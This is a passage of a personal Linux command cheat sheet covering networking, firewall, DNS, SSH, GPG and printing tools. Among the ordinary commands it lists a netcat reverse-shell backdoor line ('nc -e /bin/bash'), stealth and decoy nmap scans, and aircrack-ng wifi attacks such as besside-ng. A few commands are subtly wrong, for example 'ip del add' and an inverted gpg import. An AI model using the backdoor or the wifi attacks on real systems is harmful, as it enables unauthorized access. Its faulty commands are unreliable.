address 192.168.178.32 
netmask 255.255.255.0 
gateway 192.168.178.1
```

You can use this command to configure the Adapter based on the configuration file.

```bash
ifup eth0
```

Then, restart the network service

```bash
sudo systemctl restart networking.service
```

## ip

To see the physical network cards or NICs

```bash
sudo ip link
sudo ip link show
```

To enable/disable the interfaces

```bash
sudo ip link set dev eth0 up
sudo ip link set dev eth0 down
```

To get local IP addresses

```bash
sudo ip addr show
sudo ip addr s 
sudo ip a s
sudo ip a

# To see a specific interface
sudo ip a s eth0
```

To change IP Addresses

```bash
# Set config and set the IP address
sudo ip addr add 10.10.14.1/24 dev eth2 # temporary

# Remove the IP address
sudo ip del add 10.10.14.1/24 dev eth2
```

To see and change the routes

```bash
# List of the current routes
sudo ip route show
sudo ip route list
sudo ip route s
sudo ip r s
sudo ip r

# It has a separte command
route -n
```

To add or delete a route

```bash
# Add default gateway
sudo ip route add default via 192.168.1.1 
# Add a route
sudo ip route add 10.0.2.15 via 192.168.43.223 dev enp0s3
```

## route

To see the routes

```bash
route -n
```

To set the default gateway IP:

```bash
route add default gw <IP_Address>
```

## nmcli

You can easily install the network manager that can control your network and connectivity.

```bash
# Install the network manager to have this command
sudo apt install network-manager
nmcli
```

To get the general status

```bash
sudo nmcli general
sudo nmcli general status
```

To get devices status

```bash
sudo nmcli device
sudo nmcli device status

# To get surrounding Wifi
sudo nmcli device wifi
# To connect to Wifi
sudo nmcli device wifi connect SSID password mypassword

# // TODO: networking, radio, connection, agent, device, monitor
```

To get info about radio

```bash
# Monitor nearby wifi
sudo nmcli radio wifi
sudo nmcli radio wifi on
```

## hostname

To get the host name

```bash
hostname

# To change it temporarly
sudo hostname new-hostname
```

## hostnamectl

To change the host name permanently.

```bash
sudo hostnamectl set-hostname new-hostname
# Or you can change the /etc/hostname

# To get the status
sudo hostnamectl status
```

## ping 

The main tool for a system admin to troubleshoot the network issues.

```bash
# To set the interval between the packets
ping 4.2.2.4 -i 0.5
# To set the size of the packet
ping 4.2.2.4 --s 1000
```

## traceroute & tracepath

You can see the path of packet that you have sent using

```bash
traceroute 4.2.2.4
```

## netstat

```bash
# No reverse lookup, Routing table
netstat -nr
# Show all of the Active connections
netstat -na
# TCP, UDP, Process Name, Listening, Numberic
netstat -tulpn
```

## ss

The modern form of `netstat`.

```bash
# Show all of the Active connections
ss -na
# TCP, UDP, Process Name, Listening, Numberic
ss -tupln
```

## lsof

To list open files

```bash
# To see all of the internet related ones
lsof -i
# To print processes on the port 8080
lsof -i:8080
```

## fuser

To identify which process is using something.

```bash
# Which program is using the TCP 80 port
sudo fuser -v -n tcp 80
```

## nc or netcat

`nc` is a TCP/IP swiss army knife. To install the `nc` command you need to install `netcat`

To create a new TCP connection

```bash
nc localhost 8888
```

To send some data when creating a new connection

```bash
echo -n "How's it going?" | nc localhost 8888
```

To listen to a specific port

```bash
# Listen on a port, Verbose mode
nc -l -p <PORT> -v
nc -zvw10 192.168.0.1 22
nc -lpv <PORT> -n <IP> # Did not worked the last time.
```

Create a back door

```bash
nc -e /bin/bash <IP> <PORT>
```

Checking ports

```bash
# nc -v -n -z -w1 <DomainName> <StartPortNo-EndPortNo>
# For instance, in our example, we had the following:
nc -v -n -z w1 192.168.133.128 1-100

# Listen to UDP
nc -u <IP> <PORT>
```

## nmap

It is a tool for analyzing the network of the target. The point is that you do not have to be in this machine to use the command.

```bash
# To analyze the local host network
nmap localhost
# To anaylyze the current network
nmap 192.168.1.2/24
```

To scan the target with an attempt to determine the version

```bash
nmap -sV 192.168.1.1
```

To check all of the ports of an IP

```bash
nmap -p- 192.168.1.100
```

To discover once

```bash
nmap -sL ip.txt
```

To check all of ports in all of the range of these ip

```bash
nmap 192.168.1.0/24
```

Use `nmap` to check alive hosts instead of using lots of `ping`

```bash
nmap -sP 10.7.1.0/24
```

Look for open ports in these range of hosts

```bash
# -T for TCP
sudo nmap -sT -p 80,443 10.7.1.0/24
# -S for Stealthy, SYN Scan, Half open
sudo nmap -sS -p 90,443 10.7.1.0/24
# To open top 1000 ports on a specific host
sudo nmap -sT 10.7.1.226
```

To check target OS

```bash
sudo nmap -O 10.7.1.226
# Aggressive mode, Lots of information about
sudo nmap -A 10.7.1.226
```

Using decoy

```bash
# Duplicate the traffics for another IP address
sudo nmap -sS -D 10.7.1.80 10.7.1.226
```

Check vulnerability by scripts

```bash
# Check vulnhub.com
sudo nmap --script vuln 10.7.1.226
```

```bash
nmap -sC -sV -oN nmap/initial <IP>
```

Not discovered the services? (Maybe it is because of firewall)

```bash
# Service scan, UDP Scan, Drop initial ping
nmap -sS sU -PN 192.168.0.1
```

## tcpflow

To see packets that are sending or receiving 

```bash
# Show me the port
sudo tcpflow -c port 80 
```

## tcpdump

You can save the communication to analyze

```bash
tcpdump
```

## host

To lookup DNS queries

```bash
host yahoo.com
```

## dig

Returns the DNS request's result

```bash
dig google.com
# Use a specific DNS
dig @8.8.8.8 google.com
```

## getent

```bash
# Returns all of host entries
getent hosts
getent hosts localhost
```

## arp-scan

Search all of the active IP Addresses

```bash
# Install the arp-scan
sudo apt-get install arp-scan

# Scan the local IP addresses in network
sudo arp-scan --interface=eth0 --localnet
```

## resolvectl

For new versions of ubuntu, you can use `resolvectl` for DNS.

```bash
resolvectl status
```

## iw

```bash
iwconfig

# sudo iwlist <INTERFACE> scan | grep ESSID
sudo iw dev wlan0 scan | grep SSID

# To connect Wifi
wpa_passphrase <YOUR-ESSID> <YOUR-PASS> | sudo tee /etc/wpa_supplicant.conf
sudo wpa_supplicant -c /etc/wpa_supplicant.conf -i wlp4s0

# Get the name of current SSID
iwgetid
```

## Aircrack

Start monitoring

```bash
airmon-ng start wlan0
```

Start sniffing the packets

```bash
airodump-ng  wlan0mon
```

```bash
aireplay-ng --test wlan0mon
```

```bash
besside-ng wlan0mon -R Irancell-TD-9283727
```

## FTP

You can transfer your files using FTP

```bash
ftp <IP_ADDRESS>
```

> You can use `ls`, `dir`, `get`, and etc to interact with ftp shell.

## Telnet

To connect to a TCP connection.

```bash
telnet <HOST> <PORT>
```

## Ipcalc

To calculate the ip address bits and patterns

```bash
ipcalc <IP_ADDRESS>
```

## iptables

The basic idea behind iptables is to allow you to filter network traffic and control which packets are allowed to pass through your system.

### Tables

A "table" is a collection of chains that are used to filter or modify packets as they pass through the firewall. Each table is responsible for a specific type of processing, and there are five built-in tables in iptables:

1. **filter**: This is the default table and is used for filtering packets based on criteria such as source IP address, destination IP address, protocol, and port number. The filter table has three built-in chains: INPUT, OUTPUT, and FORWARD.
2. **nat**: This table is used for network address translation (NAT) and is responsible for modifying the source or destination IP addresses or port numbers of packets. The nat table has three built-in chains: PREROUTING, OUTPUT, and POSTROUTING.
3. **mangle**: This table is used for packet modification such as marking packets or changing the TOS (Type of Service) field. The mangle table has five built-in chains: PREROUTING, OUTPUT, INPUT, FORWARD, and POSTROUTING.
4. **raw**: This table is used for packet filtering before connection tracking is applied. The raw table has two built-in chains: PREROUTING and OUTPUT.
5. **security**: This table is used for Mandatory Access Control (MAC) rules and is only available if your system has SELinux enabled.

### Chains

In iptables, a chain is a collection of rules that are used to filter network traffic at a specific stage of packet processing. For example, in the filter table:

- **INPUT**: This chain is used to filter incoming packets that are destined for the local system.
- **OUTPUT**: This chain is used to filter outgoing packets that are generated by the local system.
- **FORWARD**: This chain is used to filter packets that are being forwarded between two network interfaces.
- **POSTROUTING**: This chain is executed after the routing decision is made for a packet, and is responsible for modifying the packet's source address or port before it is sent out on the network.
- **PREROUTING**: This chain is executed before the routing decision is made for a packet, and is responsible for modifying the packet's destination address or port before it is forwarded to its final destination.

These are some of the most commonly used built-in chains in iptables, but there are many others available depending on your specific firewall configuration and requirements.

Each chain consists of a list of rules that are processed in order. If a packet matches a rule, the action specified by that rule is taken, and no further rules are processed.

### Actions

There are several built-in actions in iptables, including:

- **ACCEPT**: This action allows the packet to continue through the firewall.
- **DROP**: This action discards the packet without sending any response to the sender, effectively blocking the traffic.
- **REJECT**: This action discards the packet and sends an ICMP "destination unreachable" message to the sender, informing them that the packet was blocked.
- **LOG**: This action logs information about the packet to the system log file, allowing you to monitor network traffic and troubleshoot firewall issues.
- **DNAT**: This action is used for destination NAT (Network Address Translation), and changes the destination IP address of the packet before forwarding it on to its destination.
- **SNAT**: This action is used for source NAT, and changes the source IP address of the packet before sending it out on a different network interface.
- **MASQUERADE**: This action is used in the `nat` table to modify the source IP address of the packet to the IP address of the outgoing network interface.

### See Current Rules

When you view the iptables ruleset with the `iptables -L` command, you will see a list of rules that are organized into chains. The chains represent different stages of packet processing, and each rule specifies a set of conditions that a packet must meet in order to match the rule.

```bash
# See the firewall rules (actually the name is netfilter)
iptables -L
# To show them fast use -n and -v for more information
iptables -L -n -v

# To see rules and chains of a specific table
iptables -t <table_name> -L
```

### Create a Table

```bash
iptables -t <table-name> <command>
```

### Create a chain

In addition to the built-in chains, you can create your own custom chains. Custom chains are useful when you need to apply a complex set of rules to a specific type of traffic. For example, you might create a custom chain to handle traffic that is destined for a specific port or IP address range.

```bash
iptables -N mychain
```

### Change Rules

A rule can be added to a chain using the "-A" option, and it can be deleted using the "-D" option. The `-j` or jump action determines which target or chain the packet will be sent to for further processing.

```bash
# To add a new rule
# To block an IP address
iptables -A INPUT -s <SOURCE_IP> -j DROP

# To block a TCP port
iptables -A INPUT -p tcp --dport 3200 -j DROP 
```

### Forward the Traffic

You can use iptables to forward all traffic on a port to another port or IP address using the "DNAT" (Destination NAT) action. Here's an example command to forward all incoming traffic on port 80 to port 8080 on a specific IP address:

```bash
# -t nat is to speicify the nat table
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.100:8080
```

## DNS file `resolv.conf`

The `/etc/resolv.conf` configuration file contains information that allows a computer to convert alpha-numeric domain names into numeric IP addresses.

The process of converting domain names to IP addresses is called **resolving**.

> When using DHCP, **`dhclient`** usually rewrites **`resolv.conf`** with information received from the DHCP server.

There are three main configuration directives in `/etc/resolv.conf`:

```
nameserver # DNS server IP
domain # Domain Name of local host
search # Which Domain to search
```

### Nameserver

The `nameserver` directive points out to the IP address of a Name Server.

```
nameserver <IP address>
```

It can be your own Name Server, some [public Name Server](https://www.shellhacks.com/en/Free-Fast-Public-DNS-Servers), or the Name Server of your’s ISP.

> Note: Up to 3 name servers may be listed.

Example:

```
nameserver 192.168.0.100
nameserver 8.8.8.8
nameserver 8.8.4.4
```

### Domain

Local domain name.

```
domain <local domain name>
```

Example:

```
domain domain.com
nameserver 192.168.0.100
nameserver 8.8.4.4
```

How does the “domain” directive in the `resolv.conf` file works?

You can use `domain` directives for resolving short host-names – e.g. `test`. So if you have the following in your `/etc/resolv.conf`:

```
domain example.com
```

Then your computer will try to resolve `test.example.com`.

### Search

Search list for hostname lookup. The search list is normally determined from the local domain name but it can be set to a list of domains.

```
search <search list>
```

Example:

```
search example.com company.net
nameserver 192.168.0.100
nameserver 8.8.8.8
```

How does the “search” directive in the `resolv.conf` file works?

You need to use `search` directive for resolving short host-names – e.g. `test`. So if you have the following in your `/etc/resolv.conf`:

```
search example.com company.net
```

Then your computer will try to resolve `test.example.com` followed by `test.company.net`. It will return the first query that was successful.

### Records

- A Record: Mapping a IPv4 to host names.
- AAAA Record: Mapping a IPv6 to host names.
- CNAME Record: Mapping a host name to other host names.

### nslookup

The `nslookup` tool does not consider the local configurations for the DNS, It just look at the DNS server.

```python
nslookup
> google.com
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	google.com
Address: 142.250.179.174
Name:	google.com
Address: 2a00:1450:400e:802::200e
```

# Encryption

## ssh-keygen

To generate new pair of keys

```bash
ssh-keygen
# To specify the type of the key
ssh-keygen -t edsa
```

## ssh-copy-id

To set the key as an authorized key.

```bash
ssh-copy-id 192.168.1.20 
```

## ssh-agent

Create a bash that contains the key

```bash
ssh-agent /bin/bash
```

## ssh-add

To add a key

```bash
ssh-add ~/.ssh/mykey
```

## gpg

```bash
# List of the keys
gpg --list-keys
# Generate new key
gpg --gen-key

# Export the public key
gpg --export mykey > mykey.pub
# Import the public key
gpg --import mykey > mykey.pub
# Generate a revoke
gpg --output mykey.revoke --gen-revoke amin@amin.com

# Encrypt a file
gpg --out encrypted --recipient amin@amin.com --encrypt text.file
# Decrypt a file
gpg --out text.file --decrypt encrypted

# Sign a file
gpg --out text.sign --sign text.file
gpg --out text.sign --clearsign text.file
# Verify a file
gpg --verify text.sign
```

# Fantasy packages

## Figlet

You can use Figlet to print fantasy text arts.

```bash
# Install
sudo apt install figlet

# Print some text using align and width
figlet -w 100 -c Amin-MAG

# Print center of the current terminal
figlet -t -c Amin-MAG

# Read from file and print with space
figlet -ktp < child.txt

# To use custom fonts located in /usr/share/figlet
```

## Toilet

```bash
# Install 
sudo apt install toilet

# Print basic text
toilet -k Amin-MAG
```

# Third-Party Packages

## lshw

To get some information about network adapters

```bash
# Install the lshw
# sudo apt install lshw
sudo lshw -class network
```

## Termgraph

```bash
# Installation 
python3 -m pip install termgraph

# A simple graph
cat file | sort | uniq -c | awk '{print $2 " " $1}' | termgraph 
```

## yt-dlp

Youtube downloader tool.

```bash
# Download the audio of the video in the format of mp3
yt-dlp -x --audio-format mp3 'https://youtube.com/the_address_of_video'
```

# CUPS

You need to `cups-bsd` for these command lines.

## lpr

To send a new print request for a file.

```bash
lpr -P MyPrinter myfile
```

## lpq

Show jobs in the printers.

```bash
# Show all 
lpq -a

# To cancel a job
lprm <JOB_ID>
# To cancel all of jobs
lprm -
```

## lpc

To get status of all printers

```bash
lpc

cupsaccept <PRINTER_NAME> "Message"
cupsreject <PRINTER_NAME> "Message"
cupsenable <PRINTER_NAME> "Message"
cupsdisable <PRINTER_NAME> "Message"
```
